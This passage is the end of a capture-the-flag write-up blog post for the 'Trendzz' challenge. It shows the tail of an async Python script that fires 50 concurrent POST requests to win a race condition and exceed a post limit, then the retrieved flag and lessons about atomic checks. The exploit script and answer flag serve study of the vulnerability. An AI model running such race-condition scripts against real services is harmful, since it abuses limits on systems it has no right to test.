</span></span><span class=line><span class=cl>            <span class=n>text</span> <span class=o>=</span> <span class=k>await</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Response: </span><span class=si>{</span><span class=n>text</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>concurrency_limit</span> <span class=o>=</span> <span class=mi>100</span>  <span class=c1># Limit the number of concurrent requests</span>
</span></span><span class=line><span class=cl>    <span class=n>semaphore</span> <span class=o>=</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>Semaphore</span><span class=p>(</span><span class=n>concurrency_limit</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>async</span> <span class=k>with</span> <span class=n>aiohttp</span><span class=o>.</span><span class=n>ClientSession</span><span class=p>(</span><span class=n>connector</span><span class=o>=</span><span class=n>aiohttp</span><span class=o>.</span><span class=n>TCPConnector</span><span class=p>(</span><span class=n>limit</span><span class=o>=</span><span class=n>concurrency_limit</span><span class=p>))</span> <span class=k>as</span> <span class=n>session</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tasks</span> <span class=o>=</span> <span class=p>[</span><span class=n>send_post</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>semaphore</span><span class=p>)</span> <span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>50</span><span class=p>)]</span>
</span></span><span class=line><span class=cl>        <span class=k>await</span> <span class=n>asyncio</span><span class=o>.</span><span class=n>gather</span><span class=p>(</span><span class=o>*</span><span class=n>tasks</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Run the main function</span>
</span></span><span class=line><span class=cl><span class=n>asyncio</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>main</span><span class=p>())</span>
</span></span></code></pre></div><p>Running <code>python solve.py</code> should create more than 12 posts. To verify my claim,
let&rsquo;s try to access <code>/user/flag</code> to see if we actually get the flag.</p><p><img alt=flag loading=lazy src=/blog/images/2024-09-02-11-41-35.png></p><p>And there you go~ Flag is: <code>CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}</code></p><hr><p>Lessons Learned from this challenge:</p><ol><li><strong>Race Conditions</strong>: Ensure checks and operations are atomic.</li><li><strong>Source Code Review</strong>: Look for vulnerabilities in code.</li><li><strong>Concurrency Issues</strong>: Test for concurrent request handling.</li><li><strong>Automated Testing</strong>: Use scripts to detect issues.</li><li><strong>Environment Security</strong>: Protect sensitive data in environment variables.</li></ol></div><footer class=post-footer><ul class=post-tags><li><a href=https://hxuu.github.io/blog/tags/ctf/>Ctf</a></li><li><a href=https://hxuu.github.io/blog/tags/write-up/>Write-Up</a></li><li><a href=https://hxuu.github.io/blog/tags/cyberspace/>Cyberspace</a></li></ul><nav class=paginav><a class=prev href=https://hxuu.github.io/blog/ctf/cyberspace24/trendz/><span class=title>« Prev</span><br><span>CyberSpace24 - Trendz</span>
</a><a class=next href=https://hxuu.github.io/blog/ctf/cyberspace24/feature-unlocked/><span class=title>Next »</span><br><span>CyberSpace24 - Feature Unlocked</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on x" href="https://x.com/intent/tweet/?text=CyberSpace24%20-%20Trendzz&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f&amp;hashtags=ctf%2cwrite-up%2ccyberspace"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f&amp;title=CyberSpace24%20-%20Trendzz&amp;summary=CyberSpace24%20-%20Trendzz&amp;source=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on reddit" href="https://reddit.com/submit?url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f&title=CyberSpace24%20-%20Trendzz"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on whatsapp" href="https://api.whatsapp.com/send?text=CyberSpace24%20-%20Trendzz%20-%20https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on telegram" href="https://telegram.me/share/url?text=CyberSpace24%20-%20Trendzz&amp;url=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share CyberSpace24 - Trendzz on ycombinator" href="https://news.ycombinator.com/submitlink?t=CyberSpace24%20-%20Trendzz&u=https%3a%2f%2fhxuu.github.io%2fblog%2fctf%2fcyberspace24%2ftrendzz%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=https://hxuu.github.io/blog/>hxuu</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>